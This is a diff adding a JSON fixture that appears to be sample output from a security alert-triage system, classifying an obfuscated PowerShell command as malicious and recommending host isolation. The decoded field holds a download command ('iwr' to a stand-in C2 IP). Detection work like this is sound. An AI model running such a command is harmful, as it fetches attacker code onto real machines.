@@ -1,0 +1,64 @@
+{
+  "triage_id": "trg-0001",
+  "reference_event_id": "evt-0001",
+  "analysis_timestamp": "2026-10-03T14:32:03.112000Z",
+  "config_version": "<rules-ver>+<ml-ver>+<extractor-model-id>+<reasoner-model-id>",
+  "verdict": "Malicious",
+  "state": "complete",
+  "metrics": {
+    "risk_score": 85,
+    "confidence_score": 90
+  },
+  "tier_trace": [
+    {
+      "tier": "A",
+      "rule_ids": [
+        "<sigma-rule-id>"
+      ]
+    },
+    {
+      "tier": "C",
+      "role": "extractor",
+      "model_version": "<extractor-model-id>"
+    },
+    {
+      "tier": "C",
+      "role": "reasoner",
+      "model_version": "<reasoner-model-id>"
+    }
+  ],
+  "decoded_content": {
+    "command_line_decoded": "iwr 198.51.100.42/u",
+    "obfuscation_type": "Base64 (UTF-16LE)",
+    "injection_flags_detected": []
+  },
+  "techniques": [
+    {
+      "framework": "MITRE_ATTACK",
+      "id": "T1059.001",
+      "name": "PowerShell"
+    },
+    {
+      "framework": "MITRE_ATTACK",
+      "id": "T1071.001",
+      "name": "Web Protocols"
+    }
+  ],
+  "justification": "Base64 UTF-16LE PowerShell command invokes Invoke-WebRequest (iwr) communicating with external IP 198.51.100.42, which carries a malicious C2 reputation score of 88.",
+  "evidence_refs": [
+    "evt-0001",
+    "enrichment:198.51.100.42"
+  ],
+  "recommended_response": [
+    {
+      "action": "Isolate Host",
+      "target": "WKS-09",
+      "priority": "P0"
+    },
+    {
+      "action": "Revoke User Session",
+      "target": "CORP\\jdoe",
+      "priority": "P1"
+    }
+  ]
+}
